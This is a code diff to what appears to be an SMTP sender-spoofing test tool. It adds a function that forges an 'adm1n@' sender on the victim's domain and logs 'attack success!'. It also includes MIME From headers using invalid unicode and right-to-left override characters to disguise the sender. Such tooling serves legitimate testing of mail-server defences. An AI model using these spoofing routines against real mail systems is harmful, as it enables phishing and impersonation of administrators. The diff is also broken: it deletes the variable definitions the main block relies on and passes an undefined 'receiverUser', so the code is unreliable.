@@ -11,7 +11,7 @@ from email.mime.text import MIMEText
 from email.header import Header
 from util.log import init_log
 from core.SMTP import SendMailDealer
-from config import ACCOUNTS
+from config import *
 
 rstr = string.ascii_letters + string.digits
 RSTR = list(map(lambda x: x.encode(), rstr))  # str --> byte
@@ -46,7 +46,26 @@ def test_mail_mime_attack(user, passwd, smtp_server, receiveUser):
     # mime_from can specify any value you like.
     demo.sendMail(to_email=to_email, info=info, mime_from=mime_from,subject=info)
 
-def test_mail_mime_xff_attack(user, passwd, smtp_server, receiveUser,special_unicode):
+def test_login_mail_attack(user, passwd, smtp_server, receiverUser):
+    """
+    :return:
+    """
+    smtp, port = smtp_server.split(":")
+    demo = SendMailDealer(user, passwd, smtp, port)
+    to_email = receiverUser
+    info = u"test_login_mail_attack"
+    domain = user.split('@')[1]
+    mail_from = 'adm1n@' + domain
+    try:
+        demo.sendMail(to_email=to_email, info=info, mail_from=mail_from,subject=info)
+    except Exception as e:
+        logger.error(e)
+        logger.info("attack failed.")
+        return False
+    logger.info("attack success!")
+    return True
+
+def test_mail_mime_chars_attack(user, passwd, smtp_server, receiveUser,special_unicode):
     """
     Test whether the smtp server supports different unicode in MIME FROM header
     :return:
@@ -59,6 +78,7 @@ def test_mail_mime_xff_attack(user, passwd, smtp_server, receiveUser,special_uni
     username = user.split('@')[0]
     special_unicode = '\xff'
     mime_from = username+special_unicode+'@'+domain
+    # You can also try other types here. Such as "emailtest{}test@emailtest.com".format(special_unicode)...
     demo.sendMail(to_email, info=info, mime_from=mime_from)
 
 def test_multiple_mime_from1(user, passwd, smtp_server, receiveUser):
@@ -193,7 +213,6 @@ def test_reverse_mime_from_domain(user, passwd, smtp_server, receiveUser):
     """
     smtp, port = smtp_server.split(":")
     mime_from = "test@\u202etest.xyz\u202d"
-    mime_from = "\u202emoc.qq@\u202dadmin"
     demo = SendMailDealer(user, passwd, smtp, port)
     to_email = receiveUser
     info = u"test_reverse_mime_from_domain"
@@ -215,24 +234,11 @@ if __name__ == '__main__':
     Other parameters like mail_from,mime_from,mime_from1,mime_from2 can be specified if smtp server allow.
     :return:
     """
-    account = ACCOUNTS['account']
-    #Change 'account' to what you like to test.
-    user = account['user']
-    passwd = account['apipass']
-    smtp_server = account['smtp_server']
-    receiveUser = 'xxx@gmail.com'
-    #Change receiveUser to what you like to test.
-    subject = 'This is subject'
-    content = """This is content"""
-    filename = None
-    image = None
     test_normal(user, passwd, smtp_server, receiveUser,subject,content,mime_from=None,filename=filename,mime_from1=None,mime_from2=None,mail_from=None,image=image)
-
-
-
     test_mail_mime_attack(user, passwd, smtp_server, receiveUser)
+    test_login_mail_attack(user, passwd, smtp_server, receiverUser)
     special_unicode = '\xff'
-    test_mail_mime_xff_attack(user, passwd, smtp_server, receiveUser,special_unicode)
+    test_mail_mime_chars_attack(user, passwd, smtp_server, receiveUser,special_unicode)
     test_multiple_mime_from1(user, passwd, smtp_server, receiveUser)
     test_multiple_mime_from2(user, passwd, smtp_server, receiveUser)
     test_multiple_value_mime_from1(user, passwd, smtp_server, receiveUser)
